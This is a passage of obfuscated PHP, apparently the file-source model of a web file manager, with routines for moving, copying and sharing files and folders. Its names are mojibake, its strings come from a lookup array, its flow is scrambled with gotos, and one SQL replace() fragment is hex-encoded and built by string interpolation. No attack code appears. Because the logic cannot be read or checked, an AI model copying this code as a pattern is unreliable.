FˆˆìéÓö¾: foreach ($FÉô–ˆôÅ˜ as $FÈˆÊó°¢±) { $aô‚£™¸¢Ö = $FÈˆÊó°¢±[$AÃğ‚£àİ[365]]; $bÄ‡ÉéÁĞõ = $this->_childrenMatch($eÜåÑè×õØ, $FÈˆÊó°¢±, $e¨ƒ¾†â¡ ); $e„Ö¹õõ¢ç[] = array($AÃğ‚£àİ[365], $aô‚£™¸¢Ö, $AÃğ‚£àİ[456], $bÄ‡ÉéÁĞõ[$AÃğ‚£àİ[456]]); $Eö»‡“ğâœ[] = array($AÃğ‚£àİ[365], $aô‚£™¸¢Ö, $AÃğ‚£àİ[454], $bÄ‡ÉéÁĞõ[$AÃğ‚£àİ[454]]); $this->_copyApplyMeta($FÈˆÊó°¢±, $C‰íğ¨øâ”); if ($FÈˆÊó°¢±[$AÃğ‚£àİ[366]] != $AÃğ‚£àİ[83]) { $C‰íğ¨øâ”[$AÃğ‚£àİ[496]][] = $FÈˆÊó°¢±[$AÃğ‚£àİ[414]]; } } $this->chunkEventSet($AÃğ‚£àİ[508], array($AÃğ‚£àİ[509], $fâ ´·Ş´³, $dÍ”ĞŒè×)); $this->saveAll($e„Ö¹õõ¢ç); goto Fß¦­¿ª‘‘; fÃÚ«Çª˜: $this->addAll($F‰ÛÃïæóÄ, array(), !1); $FÉô–ˆôÅ˜ = $this->where(array($AÃğ‚£àİ[456] => $e½İ—Ÿ¡¦Û))->select(); $eÜåÑè×õØ = $this->_childrenMakeRelation($Aø¯£õ, $FÉô–ˆôÅ˜); goto A£¤ª‚‹ˆ‘; Fß¦­¿ª‘‘: $this->chunkEventSet($AÃğ‚£àİ[510], array($AÃğ‚£àİ[511], $fâ ´·Ş´³, $dÍ”ĞŒè×)); $this->saveAll($Eö»‡“ğâœ); return $e½İ—Ÿ¡¦Û; goto c‘•ØÙÉ; c‘•ØÙÉ: } private function _childrenMakeRelation($F‰îŒİ‘©Õ, $d»Œààˆ) { $cÎˆè¼„½É =& $_SERVER[Õİõş]; $CÁ•ö÷Ì´¤ = array(); $eßªÍ¬¼…Î = array(); foreach ($F‰îŒİ‘©Õ as $aåÛÆÉø‰©) { $bƒî¬®Ş¶¹ = $aåÛÆÉø‰©[$cÎˆè¼„½É[28]] . $cÎˆè¼„½É[8] . $aåÛÆÉø‰©[$cÎˆè¼„½É[454]]; $CÁ•ö÷Ì´¤[$bƒî¬®Ş¶¹] = $aåÛÆÉø‰©[$cÎˆè¼„½É[365]]; } foreach ($d»Œààˆ as $aåÛÆÉø‰©) { $bƒî¬®Ş¶¹ = $aåÛÆÉø‰©[$cÎˆè¼„½É[28]] . $cÎˆè¼„½É[8] . $aåÛÆÉø‰©[$cÎˆè¼„½É[454]]; $C°Ã¡’Öé = $CÁ•ö÷Ì´¤[$bƒî¬®Ş¶¹]; $eßªÍ¬¼…Î[$C°Ã¡’Öé] = $aåÛÆÉø‰©[$cÎˆè¼„½É[365]]; } return $eßªÍ¬¼…Î; } private function _childrenMatch($c¶½Ãæ²—Æ, $cÇ¦Ó»‹, $dŠĞ†±šƒ) { goto BÑö—ÃòÒ¹; BÑö—ÃòÒ¹: $d¯Èó±§ =& $_SERVER[Õİõş]; $eÕŞ—×¡Ö = $dŠĞ†±šƒ[$d¯Èó±§[454]]; $D‰øµ¸¬Ä = $this->parentLevelArray($cÇ¦Ó»‹[$d¯Èó±§[454]]); goto F¼ÓÊ´ùï›; e•ŒƒÚŞë: $DšÔİ‚ÇóÇ = $b¹ÄòãóØ[count($b¹ÄòãóØ) - 1]; return array($d¯Èó±§[456] => $DšÔİ‚ÇóÇ, $d¯Èó±§[454] => $eÕŞ—×¡Ö); goto dªò„á »Ş; F¼ÓÊ´ùï›: foreach ($D‰øµ¸¬Ä as $dãê®ªÜ¡œ) { if (isset($c¶½Ãæ²—Æ[$dãê®ªÜ¡œ])) { $eÕŞ—×¡Ö .= $c¶½Ãæ²—Æ[$dãê®ªÜ¡œ] . $d¯Èó±§[512]; } } $eÕŞ—×¡Ö = rtrim($eÕŞ—×¡Ö, $d¯Èó±§[47]) . $d¯Èó±§[47]; $b¹ÄòãóØ = $this->parentLevelArray($eÕŞ—×¡Ö); goto e•ŒƒÚŞë; dªò„á »Ş: } private function _makeItemData($aÒ¬ê²øòø, $D¢äØÉ¢êÛ, $BËŠ•„Šã¦) { $E´«…Šºİœ =& $_SERVER[Õİõş]; $dÇª÷‘ù = array($E´«…Šºİœ[513] => $aÒ¬ê²øòø[$E´«…Šºİœ[366]], $E´«…Šºİœ[382] => $BËŠ•„Šã¦, $E´«…Šºİœ[514] => $aÒ¬ê²øòø[$E´«…Šºİœ[368]], $E´«…Šºİœ[415] => $aÒ¬ê²øòø[$E´«…Šºİœ[414]], $E´«…Šºİœ[515] => $aÒ¬ê²øòø[$E´«…Šºİœ[77]], $E´«…Šºİœ[516] => $D¢äØÉ¢êÛ[$E´«…Šºİœ[367]], $E´«…Šºİœ[517] => $D¢äØÉ¢êÛ[$E´«…Šºİœ[451]], $E´«…Šºİœ[518] => USER_ID, $E´«…Šºİœ[519] => USER_ID, $E´«…Šºİœ[364] => $D¢äØÉ¢êÛ[$E´«…Šºİœ[365]], $E´«…Šºİœ[520] => $D¢äØÉ¢êÛ[$E´«…Šºİœ[454]] . $D¢äØÉ¢êÛ[$E´«…Šºİœ[365]] . $E´«…Šºİœ[47], $E´«…Šºİœ[391] => 0, $E´«…Šºİœ[521] => $E´«…Šºİœ[33]); return $dÇª÷‘ù; } private function _copyApplyMeta($dÎ°·¼²×ˆ, &$DøƒŒÕ®Ö†) { $fŒ‰²ˆÓÃÚ =& $_SERVER[Õİõş]; $DÖÆÔ‹É ‡ = $dÎ°·¼²×ˆ[$fŒ‰²ˆÓÃÚ[365]]; $b‚ø²¶‹ï = $dÎ°·¼²×ˆ[$fŒ‰²ˆÓÃÚ[28]]; if (!isset($dÎ°·¼²×ˆ[$fŒ‰²ˆÓÃÚ[522]]) || !$dÎ°·¼²×ˆ[$fŒ‰²ˆÓÃÚ[522]] || $dÎ°·¼²×ˆ[$fŒ‰²ˆÓÃÚ[522]] == $fŒ‰²ˆÓÃÚ[463]) { $DøƒŒÕ®Ö†[$fŒ‰²ˆÓÃÚ[498]][] = array($fŒ‰²ˆÓÃÚ[365], $DÖÆÔ‹É ‡, $fŒ‰²ˆÓÃÚ[522], short_id($DÖÆÔ‹É ‡)); } if (Input::check($b‚ø²¶‹ï, $fŒ‰²ˆÓÃÚ[523])) { $DøƒŒÕ®Ö†[$fŒ‰²ˆÓÃÚ[497]][] = array($fŒ‰²ˆÓÃÚ[365] => $DÖÆÔ‹É ‡, $fŒ‰²ˆÓÃÚ[89] => $fŒ‰²ˆÓÃÚ[411], $fŒ‰²ˆÓÃÚ[355] => str_replace($fŒ‰²ˆÓÃÚ[50], $fŒ‰²ˆÓÃÚ[33], Pinyin::encode($b‚ø²¶‹ï))); $DøƒŒÕ®Ö†[$fŒ‰²ˆÓÃÚ[497]][] = array($fŒ‰²ˆÓÃÚ[365] => $DÖÆÔ‹É ‡, $fŒ‰²ˆÓÃÚ[89] => $fŒ‰²ˆÓÃÚ[410], $fŒ‰²ˆÓÃÚ[355] => Pinyin::encode($b‚ø²¶‹ï, $fŒ‰²ˆÓÃÚ[524])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($BÛá‡¹–­½) { goto c®¼Ä”·Ì‘; c®¼Ä”·Ì‘: $FÑ„“‚¶… =& $_SERVER[Õİõş]; $D ˆĞ®ìŞæ = $this->sourceInfo($BÛá‡¹–­½); $F…‹à½Ò§ = $FÑ„“‚¶…[525]; goto c–•†ÂŞ‡Ş; c–•†ÂŞ‡Ş: $bš©è­£’‡ = array($FÑ„“‚¶…[454] => array($FÑ„“‚¶…[478], $D ˆĞ®ìŞæ[$FÑ„“‚¶…[454]] . $BÛá‡¹–­½ . $FÑ„“‚¶…[479]), $FÑ„“‚¶…[392] => $this->targetIsDelete); $Bå¶”øëì = $this->field($F…‹à½Ò§)->where($bš©è­£’‡)->select(); if (!$Bå¶”øëì) { return; } goto AÀøÉäßâ; AÀøÉäßâ: $Bå¶”øëì = array_to_keyvalue($Bå¶”øëì, $FÑ„“‚¶…[365]); foreach ($Bå¶”øëì as $aœ”œåµœß) { $aÛÙî—âÌà = $aœ”œåµœß[$FÑ„“‚¶…[456]]; $BÛá‡¹–­½ = $aœ”œåµœß[$FÑ„“‚¶…[365]]; if (!isset($this->_childrenListCache[$BÛá‡¹–­½]) && $aœ”œåµœß[$FÑ„“‚¶…[366]] == $FÑ„“‚¶…[83]) { $this->_childrenListCache[$BÛá‡¹–­½] = array(); } if (!isset($this->_childrenListCache[$aÛÙî—âÌà])) { $this->_childrenListCache[$aÛÙî—âÌà] = array(); } $this->_childrenListCache[$aÛÙî—âÌà][$BÛá‡¹–­½] = $aœ”œåµœß; $this->_childrenItemCache[$BÛá‡¹–­½] = $aœ”œåµœß; } goto BôšĞ¾¤Ï¾; BôšĞ¾¤Ï¾: } private function _childrenListAll($EŒÑçã¯’ù, &$EÉ¸“ó›‹) { $cšŒ¤¸òƒ¡ =& $_SERVER[Õİõş]; if (!isset($this->_childrenListCache[$EŒÑçã¯’ù])) { return; } $fÃµ²î¼£ = $this->_childrenListCache[$EŒÑçã¯’ù]; foreach ($fÃµ²î¼£ as $D–ÌÑ…”­ => $f¨Ø¶ùƒ) { $EÉ¸“ó›‹[$D–ÌÑ…”­] = $f¨Ø¶ùƒ; if ($f¨Ø¶ùƒ[$cšŒ¤¸òƒ¡[366]] == $cšŒ¤¸òƒ¡[83]) { $this->_childrenListAll($D–ÌÑ…”­, $EÉ¸“ó›‹); } } } private function sourceInfoCache($cÁç•í†—ò) { if (isset($this->_childrenItemCache[$cÁç•í†—ò])) { return $this->_childrenItemCache[$cÁç•í†—ò]; } return $this->sourceInfo($cÁç•í†—ò); } private function _childrenList($B‹‰†â÷‚Ÿ) { if (isset($this->_childrenListCache[$B‹‰†â÷‚Ÿ])) { return $this->_childrenListCache[$B‹‰†â÷‚Ÿ]; } return $this->_childrenListSelect($B‹‰†â÷‚Ÿ); } private function _childrenListSelect($Aö‚åë‰¬¸) { goto cÓ²Êº£¯Ë; Dğë‚Âœµ”: foreach ($A‡ôˆ‚¥ò¹ as $Aö‚åë‰¬¸ => $C©ƒ®ãÏ¦Ô) { $this->_childrenItemCache[$Aö‚åë‰¬¸] = $C©ƒ®ãÏ¦Ô; } return $A‡ôˆ‚¥ò¹; goto f¬ºùïÍ; cÓ²Êº£¯Ë: $BÖÎ©Ë³Ê =& $_SERVER[Õİõş]; $cíù†ˆÌğ = array($BÖÎ©Ë³Ê[456] => $Aö‚åë‰¬¸, $BÖÎ©Ë³Ê[392] => $this->targetIsDelete); $AİÊÖ°à©¥ = $this->where($cíù†ˆÌğ)->select(); goto DÓŠšñ‰ÅŞ; DÓŠšñ‰ÅŞ: $AİÊÖ°à©¥ = $AİÊÖ°à©¥ ? $AİÊÖ°à©¥ : array(); $A‡ôˆ‚¥ò¹ = array_to_keyvalue($AİÊÖ°à©¥, $BÖÎ©Ë³Ê[365]); $this->_childrenListCache[$Aö‚åë‰¬¸] = $A‡ôˆ‚¥ò¹; goto Dğë‚Âœµ”; f¬ºùïÍ: } private function fileNameExistCache($bµíàä…À“, $C™ï¸ÔÙº) { $E®ò¿·°æ =& $_SERVER[Õİõş]; $C™ï¸ÔÙº = strtolower($C™ï¸ÔÙº); $f÷ÔêãŠ­æ = $this->_childrenList($bµíàä…À“); foreach ($f÷ÔêãŠ­æ as $DÜ÷¿Ôğ˜¡) { if ($C™ï¸ÔÙº == strtolower($DÜ÷¿Ôğ˜¡[$E®ò¿·°æ[28]])) { return $DÜ÷¿Ôğ˜¡[$E®ò¿·°æ[365]]; } } return !1; } private function fileNameAutoCache($f‰·œøÃÁ, $c¥Â•ñÈõ¬, $DÂÄÓáæ¯Ã, $càˆÙ•÷œ) { $Dä–Ù…ÕË =& $_SERVER[Õİõş]; $dÚŸ¸…Ë‘ˆ = $this->_childrenList($f‰·œøÃÁ); $CÏ“ÆŠÜÅ = array_to_keyvalue($dÚŸ¸…Ë‘ˆ, $Dä–Ù…ÕË[33], $Dä–Ù…ÕË[28]); return $this->fileNameAutoGet($CÏ“ÆŠÜÅ, $c¥Â•ñÈõ¬, $DÂÄÓáæ¯Ã, $càˆÙ•÷œ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($bé²¢¿—‚š, $CòßÑÂÈÂ, $eìÁåÌ‰Ç = REPEAT_REPLACE, $c’¼Ú»Š› = '') { goto E‡Æ‚„»Ì; A­õô†à¿: $fÁÒ§ªò ” = $c’¼Ú»Š› ? $c’¼Ú»Š› : $Dˆ°¿À·á[$eâ†İ­‚ø[28]]; $this->lockMoveStart($bé²¢¿—‚š); $this->lockWriteStart($CòßÑÂÈÂ, $fÁÒ§ªò ”); goto eâ„Ò™ğ¿Ü; C‘ß‘Ê²™Ô: Model($eâ†İ­‚ø[163])->linkAdd($EÍØè–©”×[$eâ†İ­‚ø[496]]); if ($DÚ©õ»Äé» && $EÍØè–©”×[$eâ†İ­‚ø[528]]) { $this->removeNow($bé²¢¿—‚š, !1); } $this->lockMoveEnd($bé²¢¿—‚š); goto AŒĞ¡÷ˆÍ÷; bòˆä½ƒÇ : $E»É¦×Ó‡æ = $this->pathInfoMore($bé²¢¿—‚š); if ($this->isParentOf($bé²¢¿—‚š, $CòßÑÂÈÂ)) { return !1; } if (!$Dˆ°¿À·á || !$fá²Ú×“ª¯ || $fá²Ú×“ª¯[$eâ†İ­‚ø[366]] != $eâ†İ­‚ø[83]) { return !1; } goto b¬ÃÖà»Î; DÄÖ§ÄÖØ: $fìæ”ƒ«ô = $this->_move($bé²¢¿—‚š, $CòßÑÂÈÂ, $eìÁåÌ‰Ç, $EÍØè–©”×, $c’¼Ú»Š›); $this->sourceCacheClear(); if ($Dˆ°¿À·á[$eâ†İ­‚ø[366]] == $eâ†İ­‚ø[83] && $DÚ©õ»Äé») { $this->folderSizeResetChildren($fìæ”ƒ«ô); } goto C‘ß‘Ê²™Ô; AŒĞ¡÷ˆÍ÷: $this->lockWriteEnd($CòßÑÂÈÂ, $fÁÒ§ªò ”); $this->folderSizeReset($Dˆ°¿À·á[$eâ†İ­‚ø[456]]); $this->folderSizeReset($CòßÑÂÈÂ); goto AÒ×ˆÍÂ; CŒØƒ‹ºÃ·: Model($eâ†İ­‚ø[500])->eventMove($bé²¢¿—‚š, $Dˆ°¿À·á[$eâ†İ­‚ø[456]], $CòßÑÂÈÂ); Hook::trigger($eâ†İ­‚ø[527], $E»É¦×Ó‡æ); return $fìæ”ƒ«ô; goto c„ğ”·ñ¬; eâ„Ò™ğ¿Ü: $EÍØè–©”× = array($eâ†İ­‚ø[496] => array(), $eâ†İ­‚ø[528] => !1); $this->clearShare($bé²¢¿—‚š, $CòßÑÂÈÂ); $DÚ©õ»Äé» = $this->fileNameExistCache($CòßÑÂÈÂ, $Dˆ°¿À·á[$eâ†İ­‚ø[28]]); goto DÄÖ§ÄÖØ; AÒ×ˆÍÂ: $F»¸¹´„ = array($Dˆ°¿À·á[$eâ†İ­‚ø[456]], $CòßÑÂÈÂ); if ($Dˆ°¿À·á[$eâ†İ­‚ø[366]] == $eâ†İ­‚ø[83]) { $F»¸¹´„[] = $bé²¢¿—‚š; } $this->updateModifyTime($F»¸¹´„); goto CŒØƒ‹ºÃ·; E‡Æ‚„»Ì: $eâ†İ­‚ø =& $_SERVER[Õİõş]; $Dˆ°¿À·á = $this->sourceInfo($bé²¢¿—‚š); $fá²Ú×“ª¯ = $this->sourceInfo($CòßÑÂÈÂ); goto bòˆä½ƒÇ ; b¬ÃÖà»Î: Hook::trigger($eâ†İ­‚ø[526], $E»É¦×Ó‡æ); $this->targetIsDelete = intval($Dˆ°¿À·á[$eâ†İ­‚ø[392]]); if ($Dˆ°¿À·á[$eâ†İ­‚ø[456]] == $CòßÑÂÈÂ && $c’¼Ú»Š› != $Dˆ°¿À·á[$eâ†İ­‚ø[28]]) { $aÔÉ»Ë¢”¬ = $this->fileNameExist($CòßÑÂÈÂ, $c’¼Ú»Š›); if ($aÔÉ»Ë¢”¬ && $Dˆ°¿À·á[$eâ†İ­‚ø[366]] == $eâ†İ­‚ø[463]) { goto e‰±Ãªë‹³; cïùòğ–œ: $this->removeNow($bé²¢¿—‚š, !1); $this->folderSizeReset($CòßÑÂÈÂ); Hook::trigger($eâ†İ­‚ø[527], $E»É¦×Ó‡æ); goto dÆ’¤Ë®“‰; e‰±Ãªë‹³: $eêØÃ÷Í‘‚ = $this->sourceInfo($aÔÉ»Ë¢”¬); $B¬¬­ë¤àÑ = $this->fileHistory($eêØÃ÷Í‘‚, $Dˆ°¿À·á[$eâ†İ­‚ø[414]], $Dˆ°¿À·á[$eâ†İ­‚ø[77]]); if (!$B¬¬­ë¤àÑ) { Model($eâ†İ­‚ø[417])->remove($Dˆ°¿À·á[$eâ†İ­‚ø[414]]); } goto cïùòğ–œ; dÆ’¤Ë®“‰: return $aÔÉ»Ë¢”¬; goto C ›‰ñ¬ÂÃ; C ›‰ñ¬ÂÃ: } } goto A­õô†à¿; c„ğ”·ñ¬: } private function _move($Bäö®åá, $A—‹®ğ•ÑÉ, $D™¨±Øñó, &$FÜ¾öµÑÔ, $eî÷Ğ‡ñ‡ø = '') { goto fÑ¦Ù¨Ìš; F“‹ô‚ÈÅ: $AÈ¢æîÏĞÇ = !1; if ($c”ÇÇ”Œïñ) { if ($D™¨±Øñó == REPEAT_RENAME_FOLDER) { $fÌÃçƒùä = $this->fileNameAuto($A—‹®ğ•ÑÉ, $fÌÃçƒùä, $D™¨±Øñó, $c”ÇÇ”Œïñ); $e‰Èò¤ØŞ¹ = $this->_moveForce($Bäö®åá, $A—‹®ğ•ÑÉ, $fÌÃçƒùä); } else { if ($D™¨±Øñó == REPEAT_RENAME_FOLDER) { $D™¨±Øñó = REPEAT_RENAME; } $E”§ ªíĞÌ = $this->_childrenListSelect($Bäö®åá); foreach ($E”§ ªíĞÌ as $BÈÄ‹Ğ¹Û) { $this->_move($BÈÄ‹Ğ¹Û[$E›Ñ·í’¬ˆ[365]], $Aã‹´„Õ¸Ÿ, $D™¨±Øñó, $FÜ¾öµÑÔ); } $AÈ¢æîÏĞÇ = !0; } } else { if ($D™¨±Øñó == REPEAT_SKIP) { $AÈ¢æîÏĞÇ = !0; } else { if ($D™¨±Øñó == REPEAT_RENAME || $D™¨±Øñó == REPEAT_RENAME_FOLDER) { $fÌÃçƒùä = $this->fileNameAuto($A—‹®ğ•ÑÉ, $fÌÃçƒùä, $D™¨±Øñó, $c”ÇÇ”Œïñ); $e‰Èò¤ØŞ¹ = $this->_moveForce($Bäö®åá, $A—‹®ğ•ÑÉ, $fÌÃçƒùä); } else { if ($D™¨±Øñó == REPEAT_REPLACE) { $aæƒ¤ƒŠ·÷ = $this->sourceInfoCache($Aã‹´„Õ¸Ÿ); $Cš¾ä¿Â ” = $this->fileHistory($aæƒ¤ƒŠ·÷, $aÖ’”×–Ò[$E›Ñ·í’¬ˆ[414]], $aÖ’”×–Ò[$E›Ñ·í’¬ˆ[77]]); if ($Cš¾ä¿Â ”) { $FÜ¾öµÑÔ[$E›Ñ·í’¬ˆ[496]][] = $aÖ’”×–Ò[$E›Ñ·í’¬ˆ[414]]; } else { $AÈ¢æîÏĞÇ = !0; } } } } } if ($AÈ¢æîÏĞÇ && !$FÜ¾öµÑÔ[$E›Ñ·í’¬ˆ[528]]) { $FÜ¾öµÑÔ[$E›Ñ·í’¬ˆ[528]] = !0; } goto Aß˜›Ûç„; fÑ¦Ù¨Ìš: $E›Ñ·í’¬ˆ =& $_SERVER[Õİõş]; $aÖ’”×–Ò = $this->sourceInfo($Bäö®åá); $c”ÇÇ”Œïñ = $aÖ’”×–Ò[$E›Ñ·í’¬ˆ[366]] == $E›Ñ·í’¬ˆ[83]; goto añë„†÷õ; aˆ˜…£†”Ñ: $this->lockWriteStart($A—‹®ğ•ÑÉ, $fÌÃçƒùä); if (!$Aã‹´„Õ¸Ÿ) { return $this->_moveForce($Bäö®åá, $A—‹®ğ•ÑÉ, $fÌÃçƒùä); } $e‰Èò¤ØŞ¹ = $Aã‹´„Õ¸Ÿ; goto F“‹ô‚ÈÅ; Aß˜›Ûç„: return $e‰Èò¤ØŞ¹; goto BÉ„óÜš–; añë„†÷õ: $fÌÃçƒùä = $eî÷Ğ‡ñ‡ø ? $eî÷Ğ‡ñ‡ø : $aÖ’”×–Ò[$E›Ñ·í’¬ˆ[28]]; $Aã‹´„Õ¸Ÿ = $this->fileNameExistCache($A—‹®ğ•ÑÉ, $fÌÃçƒùä); $this->lockMoveStart($Bäö®åá); goto aˆ˜…£†”Ñ; BÉ„óÜš–: } private function _moveForce($aÒ¤‹“‡Šß, $dˆìä–ñ, $f…ŞåÓæĞ) { goto A·÷İ½‰; Fí¢Ô–ÀÃ¸: if (!$cÛ˜ª¾´Å­) { Model($e¬éà Í[449])->authClear($aÒ¤‹“‡Šß); } $CÙœæ’‡ÔÖ = $bÏËÌëÙ‚Ü[$e¬éà Í[392]] == $e¬éà Í[83] && $bñ”—‚ÇŠ±[$e¬éà Í[392]] != $e¬éà Í[83]; if ($CÙœæ’‡ÔÖ) { $aİå”ªóº£[$e¬éà Í[391]] = 0; } goto d‰»¤±ÆäÛ; d‰»¤±ÆäÛ: if ($Fİ½„†™¤) { $D‚ë„ªŸª = array($e¬éà Í[520] => array($e¬éà Í[478], $bÏËÌëÙ‚Ü[$e¬éà Í[454]] . $bÏËÌëÙ‚Ü[$e¬éà Í[365]] . $e¬éà Í[479])); $d§›õƒñŞš = $bÏËÌëÙ‚Ü[$e¬éà Í[454]] . $bÏËÌëÙ‚Ü[$e¬éà Í[365]] . $e¬éà Í[47]; $d®É§ëŸÎ® = $bñ”—‚ÇŠ±[$e¬éà Í[454]] . $bñ”—‚ÇŠ±[$e¬éà Í[365]] . $e¬éà Í[47] . $bÏËÌëÙ‚Ü[$e¬éà Í[365]] . $e¬éà Í[47]; $cÃØºªöØ¦ = array($e¬éà Í[520] => array($e¬éà Í[529], "\x72\x65\160\x6c\x61\x63\x65\x28\x70\x61\x72\145\156\x74\x4c\x65\x76\x65\154\54\x27{$d§›õƒñŞš}\x27\54\x27{$d®É§ëŸÎ®}\x27\51"), $e¬éà Í[516] => $bñ”—‚ÇŠ±[$e¬éà Í[367]], $e¬éà Í[517] => $bñ”—‚ÇŠ±[$e¬éà Í[451]]); if ($CÙœæ’‡ÔÖ) { $cÃØºªöØ¦[$e¬éà Í[391]] = 0; } $this->where($D‚ë„ªŸª)->data($cÃØºªöØ¦)->save(); } $this->where(array($e¬éà Í[379] => $aÒ¤‹“‡Šß))->data($aİå”ªóº£)->save(); return $aÒ¤‹“‡Šß; goto AÖˆ°½ñƒ×; C¢æò£ÊÌÁ: $Fİ½„†™¤ = $bÏËÌëÙ‚Ü[$e¬éà Í[366]] == $e¬éà Í[83]; $aİå”ªóº£ = array($e¬éà Í[364] => $bñ”—‚ÇŠ±[$e¬éà Í[365]], $e¬éà Í[520] => $bñ”—‚ÇŠ±[$e¬éà Í[454]] . $bñ”—‚ÇŠ±[$e¬éà Í[365]] . $e¬éà Í[47], $e¬éà Í[516] => $bñ”—‚ÇŠ±[$e¬éà Í[367]], $e¬éà Í[517] => $bñ”—‚ÇŠ±[$e¬éà Í[451]], $e¬éà Í[519] => USER_ID, $e¬éà Í[382] => $f…ŞåÓæĞ); $cÛ˜ª¾´Å­ = $bÏËÌëÙ‚Ü[$e¬éà Í[367]] == SourceModel::TYPE_GROUP && $bñ”—‚ÇŠ±[$e¬éà Í[367]] == SourceModel::TYPE_GROUP && $bÏËÌëÙ‚Ü[$e¬éà Í[451]] == $bñ”—‚ÇŠ±[$e¬éà Í[451]]; goto Fí¢Ô–ÀÃ¸; A·÷İ½‰: $e¬éà Í =& $_SERVER[Õİõş]; $bÏËÌëÙ‚Ü = $this->sourceInfo($aÒ¤‹“‡Šß); $bñ”—‚ÇŠ± = $this->sourceInfo($dˆìä–ñ); goto C¢æò£ÊÌÁ; AÖˆ°½ñƒ×: } private function clearShare($dÏŸ—…ÒÑ, $fÈÑñÅğ¾ë) { goto eâò¶ÚÒà; Fùšó›½×: if (!$cšáÈ¯¦¿) { return; } $cšáÈ¯¦¿ = array_to_keyvalue($cšáÈ¯¦¿, $A”¶„ÙŞ…[33], $A”¶„ÙŞ…[436]); $C¸»è›™ = array($A”¶„ÙŞ…[436] => array($A”¶„ÙŞ…[7], $cšáÈ¯¦¿)); goto DÛìÁ½Ä; DÈÚÒºå‘: if (!$aŠµ°ØéÓ) { return; } $C¸»è›™ = array($A”¶„ÙŞ…[365] => array($A”¶„ÙŞ…[7], $aŠµ°ØéÓ), $A”¶„ÙŞ…[443] => 1); $cšáÈ¯¦¿ = Model($A”¶„ÙŞ…[531])->field($A”¶„ÙŞ…[436])->where($C¸»è›™)->select(); goto Fùšó›½×; a×¹´õ¤: if ($d•àáÔÌ®ä[$A”¶„ÙŞ…[451]] == $C—£ÃĞ¯½‡[$A”¶„ÙŞ…[451]] && $d•àáÔÌ®ä[$A”¶„ÙŞ…[367]] == $A”¶„ÙŞ…[530]) { return; } $C¸»è›™ = array($A”¶„ÙŞ…[454] => array($A”¶„ÙŞ…[478], $d•àáÔÌ®ä[$A”¶„ÙŞ…[454]] . $dÏŸ—…ÒÑ . $A”¶„ÙŞ…[479])); $aŠµ°ØéÓ = $this->field($A”¶„ÙŞ…[379])->where($C¸»è›™)->getField($A”¶„ÙŞ…[365], !0); goto DÈÚÒºå‘; DÛìÁ½Ä: Model($A”¶„ÙŞ…[531])->where($C¸»è›™)->save(array($A”¶„ÙŞ…[443] => 0)); Model($A”¶„ÙŞ…[532])->where($C¸»è›™)->delete(); goto E‰‰ó…¥ê; eâò¶ÚÒà: $A”¶„ÙŞ… =& $_SERVER[Õİõş]; $d•àáÔÌ®ä = $this->sourceInfo($dÏŸ—…ÒÑ); $C—£ÃĞ¯½‡ = $this->sourceInfo($fÈÑñÅğ¾ë); goto a×¹´õ¤; E‰‰ó…¥ê: } public function copyFolderFromIO($Fªèêì¨–, $CÙ±¼½‡õ, $F†ŸæóöÅ©, $CÎ–à…ÍÎÌ, $CéÓ§‹‡’, $dĞŒ¬„Ğ” = false) { goto fùÇˆ°àÎÂ; c›ÊŒëĞ¥ˆ: $DàÍ„ÑØ¼ğ = $this->fileNameExist($F†ŸæóöÅ©, $D’¨è‘Â©Ò); $a‡ÑãÉƒ± = $this->mkdir($F†ŸæóöÅ©, $D’¨è‘Â©Ò, $CÎ–à…ÍÎÌ); if (!$DàÍ„ÑØ¼ğ || $CÎ–à…ÍÎÌ == REPEAT_RENAME_FOLDER) { $CÎ–à…ÍÎÌ = !1; } goto e¦¬ö¢—ˆ¾; E×ŒŠí†À: Model($a‚åÈ‰Û[417])->linkAdd($cˆòÛ‘Õ[$a‚åÈ‰Û[496]]); Model($a‚åÈ‰Û[417])->remove($cˆòÛ‘Õ[$a‚åÈ‰Û[533]]); $this->folderSizeReset($F†ŸæóöÅ©); goto FõÀÅàƒ˜Â; e¦¬ö¢—ˆ¾: if ($DàÍ„ÑØ¼ğ) { $this->_childrenAllMake($DàÍ„ÑØ¼ğ); } Hook::trigger($a‚åÈ‰Û[534]); $this->_copyChildTo($Fªèêì¨–, $CÙ±¼½‡õ, $a‡ÑãÉƒ±, $CÎ–à…ÍÎÌ, $cˆòÛ‘Õ, $CéÓ§‹‡’); goto Aš¦ë³¿¢ã; Aš¦ë³¿¢ã: Hook::trigger($a‚åÈ‰Û[535]); if ($a‡ÑãÉƒ±) { $this->folderSizeResetChildren($a‡ÑãÉƒ±); } $this->_childrenListClear(); goto Cî¹ì—Ş¾Ó; Cî¹ì—Ş¾Ó: Model($a‚åÈ‰Û[499])->addAll($cˆòÛ‘Õ[$a‚åÈ‰Û[497]], array(), !0); Model($a‚åÈ‰Û[500])->eventCopy($a‡ÑãÉƒ±); $this->saveAll($cˆòÛ‘Õ[$a‚åÈ‰Û[498]]); goto E×ŒŠí†À; fùÇˆ°àÎÂ: $a‚åÈ‰Û =& $_SERVER[Õİõş]; $cˆòÛ‘Õ = array($a‚åÈ‰Û[497] => array(), $a‚åÈ‰Û[498] => array(), $a‚åÈ‰Û[496] => array(), $a‚åÈ‰Û[533] => array()); $D’¨è‘Â©Ò = $dĞŒ¬„Ğ” ? $dĞŒ¬„Ğ” : $Fªèêì¨–->getPathName($Fªèêì¨–->pathThis($CÙ±¼½‡õ)); goto c›ÊŒëĞ¥ˆ; FõÀÅàƒ˜Â: $this->updateModifyTime($F†ŸæóöÅ©); return $a‡ÑãÉƒ±; goto f„Ì„Ÿñ¾; f„Ì„Ÿñ¾: } private function _copyChildTo($Cº®ÔĞ¼‡“, $D›Ù›ÍâÁ, $C·­¬ïô», $b° “´ñ‹ë, &$C‹õø„í¿º, $ağ²ğ…Ëğ») { goto eÒÍöé£èô; fì†Ş°–: $A‚´¦¬’ê = $this->_childrenList($C·­¬ïô»); $A‚´¦¬’ê = array_to_keyvalue($A‚´¦¬’ê, $E…‹¾ìåˆ[28]); foreach ($AŠ±Ù´£Ç£ as $Bøœ’È«‘) { $dßÏè½’‹½ = $A‚´¦¬’ê[$Bøœ’È«‘[$E…‹¾ìåˆ[28]]]; $cµ¶åèÉÉ· = $dßÏè½’‹½[$E…‹¾ìåˆ[365]]; $this->_copyApplyMeta($dßÏè½’‹½, $C‹õø„í¿º); if ($Bøœ’È«‘[$E…‹¾ìåˆ[29]] == $E…‹¾ìåˆ[76]) { 